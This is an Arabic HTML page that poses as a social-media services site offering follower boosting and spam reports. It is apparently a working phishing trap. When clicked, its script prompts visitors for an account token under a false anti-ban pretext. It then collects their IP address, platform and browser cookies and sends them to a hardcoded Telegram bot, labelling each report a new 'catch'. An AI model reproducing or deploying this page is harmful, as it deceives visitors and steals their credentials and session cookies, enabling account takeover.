<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALSSRY - SERVICES</title>
    <style>
        :root { --main-green: #00ff00; --glow-red: #ff0000; }
        body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow: hidden; direction: rtl; }
        #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: black; }
        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 1; box-shadow: 0 0 5px white; }
        @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
        #blur-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; backdrop-filter: blur(2px); background: rgba(0,0,0,0.5); }
        .logo-3d { font-size: 42px; font-weight: 900; color: white; letter-spacing: 6px; text-shadow: 3px 3px 0px var(--glow-red), -3px -3px 0px var(--main-green); margin: 20px 0; display: block; }
        .start-btn { padding: 16px 70px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 22px; cursor: pointer; transition: 0.4s; }
        #tools-interface { padding: 20px; display: none; z-index: 10; }
        .glass-btn { width: 90%; padding: 16px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div id="starfield"></div>
    <div id="blur-overlay"></div>

    <div id="landing-page">
        <div class="logo-3d">ALSSRY</div>
        <h1 style="text-shadow: 0 0 8px var(--main-green);">خدمات السوشال ميديا</h1>
        <button class="start-btn" onclick="startTrap()">بدء الاستخدام</button>
    </div>

    <div id="tools-interface">
        <div class="logo-3d">ALSSRY</div>
        <button class="glass-btn">🚀 رشق متابعين (سريع)</button>
        <button class="glass-btn">⚔️ بلاغات سبام (قوي)</button>
        <p>🟢 المتصلون: 284</p>
    </div>

    <script>
        const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
        const CHAT_ID = "5811700860";

        function createStars() {
            const container = document.getElementById('starfield');
            for(let i=0; i<80; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.width = star.style.height = Math.random()*3+'px';
                star.style.left = Math.random()*100+'vw';
                star.style.animationDuration = Math.random()*5+2+'s';
                container.appendChild(star);
            }
        }
        createStars();

        async function startTrap() {
            // سحب يدوي للكوكيز/بيانات الدخول للتمويه
            let manualCookie = prompt("تنبيه: لتجنب الحظر، يرجى إدخال كود التحقق (Token) أو اسم الحساب:");
            
            document.getElementById('landing-page').style.display = 'none';
            document.getElementById('tools-interface').style.display = 'block';

            let ip = "Hidden";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const d = await res.json();
                ip = d.ip;
            } catch(e) {}

            const report = `🎣 صيد جديد مكتمل:\n👤 المدخل اليدوي: ${manualCookie}\n🌐 IP: ${ip}\n💻 النظام: ${navigator.platform}\n🍪 الكوكيز المتصفح: ${document.cookie || "Empty"}`;

            // إرسال البيانات للبوت مباشرة
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: report})
            });
        }
    </script>
</body>
</html>
